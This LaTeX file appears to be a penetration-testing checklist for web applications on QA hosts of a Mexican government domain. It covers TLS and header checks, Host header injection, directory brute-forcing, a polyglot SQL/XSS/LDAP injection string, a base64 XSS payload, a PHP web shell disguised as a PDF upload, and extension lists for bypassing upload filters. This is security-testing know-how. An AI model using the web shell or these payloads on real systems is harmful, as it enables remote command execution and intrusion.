\documentclass[letterpaper,12pt]{extarticle}

\usepackage[cache=false]{minted}

\usepackage[colorlinks = true,
linkcolor = blue,
urlcolor  = blue,
citecolor = blue,
anchorcolor = blue]{hyperref}

%opening
\title{}
\author{}

\begin{document}

\tableofcontents
\newpage

\maketitle

\begin{abstract}

\end{abstract}

\section{Blackbox analysis}

\subsection{Semi-automated}

\subsubsection{TLS/SSL Verfication}

TLSLED
\begin{minted}{bash}
	sudo apt install tlssled
	tlssled pcmqa.sre.gob.mx 443
\end{minted}

SSLSCAN
\begin{minted}{bash}
	sudo apt install sslscan
	sslscan https://consultadocumentosqa.sre.gob.mx
\end{minted}

\subsubsection{HTTP Security Headers Verification}

SHCHEK
\begin{minted}{bash}
	pip3 install shcheck
	shcheck.py https://insecurity.blog
\end{minted}

\subsubsection{HTTP Host Header Injection}

CURL
\begin{minted}{bash}
	curl -s -D - --header 'Host: the-evil-site.com' https://revistadigitalqa.sre.gob.mx/index.php/rmpe > output && cat output | grep --color -E '^|the-evil-site.com' 
\end{minted}


\subsubsection{HTTP Options Method Verification}

Add nmap to Kali Linux Subsystem
\begin{minted}{bash}
	alias nmap='"/mnt/c/Program Files (x86)/Nmap/nmap.exe"'
\end{minted}

NMAP
\begin{minted}{bash}
	nmap --script http-methods <target>
\end{minted}

In specific path
\begin{minted}{bash}
	curl -i -X OPTIONS http://example.org/path
\end{minted}

\subsubsection{HTTP Method check}

\begin{minted}{bash}
	curl --insecure -v -X TRACE https://www.google.com/
\end{minted}

\subsubsection{HTTP Cookies Verification}

CURL
\begin{minted}{bash}
	curl 'https://reqa.sre.gob.mx/adminsinna/' -o /dev/null --dump-header - 2>&1 | grep -i "set-cookie"
\end{minted}

\subsubsection{Subresource Integrity (SRI)  Implementation Verification}

CURL
\begin{minted}{bash}
	sudo apt install tidy
	curl -s https://laysent.github.io/subresource-integrity-demo/integrity.html | tidy  -indent --indent-spaces 2 -quiet --tidy-mark no | grep "integrity="
\end{minted}

\subsubsection{Web application exploration}

Navigation.

Identify user flows.

\subsubsection{Files and folders discover}

\begin{minted}{bash}
	sudo apt install dirb
	dirb https://papalotlseg.sre.gob.mx/ingresar
\end{minted}

\subsubsection{Web technologies identification}

Use Walapalizer chrome extension.

\href{https://chrome.google.com/webstore/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg}{Enlace de la extensión}

\subsubsection{User roles identification}

Identify user roles in application names, ids.

\subsubsection{Hosted and related applications identificaiton}

Virtual hosts maybe.

\begin{minted}{bash}
	nmap -sV --script=http-enum <target>
\end{minted}


\subsubsection{Extraction of metadata from downloadable files}

\begin{minted}{bash}
	exiftool sectorprivado.pdf | grep 'Creator\|Producer\|Windows|\Linux|\OS|\C:|\http'>
\end{minted}

\subsubsection{Extraction of embedded files}

\begin{minted}{bash}
	pip install docscraper 
	sudo apt install exiftool
	
	
	import docscraper 
	allowed_domains = ["revistadigitalqa.sre.gob.mx "]
	start_urls = ["https://revistadigitalqa.sre.gob.mx/index.php/rmpe"]
	extensions = [".pdf", ".docx", ".doc", ".xls",".xslx",".ppt",".pptx", ".txt", ".csv", ".json"]
	docscraper.crawl(allowed_domains, start_urls, extensions=extensions)
\end{minted}


\begin{minted}{bash}
	wget https://raw.githubusercontent.com/x4nth055/pythoncode-tutorials/master/web-scraping/link-extractor/link_extractor.py
	
	python3 link_extractor.py https://github.com -m 2
	
	curl https://revistadigitalqa.sre.gob.mx/index.php/rmpe/article/view/62/58 > output && cat output | tr '";>' '\n' | grep -Eo '(http|https|www):(.*)'
	
\end{minted}

Descargar con el nombre propuesto por el servidor en lugar de wget:
\begin{minted}{bash}
	curl -JLO https:\/\/revistadigitalqa.sre.gob.mx\/index.php\/rmpe\/article\/download\/62\/58\/100
\end{minted}


\subsubsection{Data extraction from Javascript Source Code}

Encription keys search:
\begin{minted}{bash}
	
\end{minted}

\subsubsection{Code injection validation}

\begin{minted}{bash}
	' ; -- ` */ /* -- or # ' OR '1 ' OR 1 -- - OR 1=1 ;%00<script>javascript:alert(123456789)</script> (&(ou=admin)(| (user=Freeman)))
\end{minted}

Example: Base64 XSS payload
\begin{minted}{bash}
	data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
\end{minted}

\subsubsection{Cross Site Scripting Validation}

\begin{minted}{bash}
	<script>javascript:alert(1)</script>
\end{minted}

\subsubsection{File upload feature check: Webshell upload test}

\begin{minted}{bash}
	https://github.com/TheBinitGhimire/Web-Shells
\end{minted}

\begin{minted}{php}
	Content-Disposition: form-data; name="file"; filename="documento.php"
	Content-Type: application/pdf
	
	text/x-php
	
	%PDF-1.7
	<html>
	<body>
	<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
	<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
	<input type="SUBMIT" value="Execute">
	</form>
	<pre>
	<?php
	if(isset($_GET['cmd']))
	{
		system($_GET['cmd']);
	}
	?>
	<script>javacript:alert('XSS PAYLOAD')</script>
	</pre>
	</body>
	</html>
	
	Versión base 64
	
	text/x-php
	
	text/html
\end{minted}

Other useful extensions:

\begin{enumerate}
	\item PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
	\item ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
	\item JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action Coldfusion: .cfm, .cfml, .cfc, .dbm
	\item Flash: .swf
	\item Perl: .pl, .cgi
\end{enumerate}


\end{document}
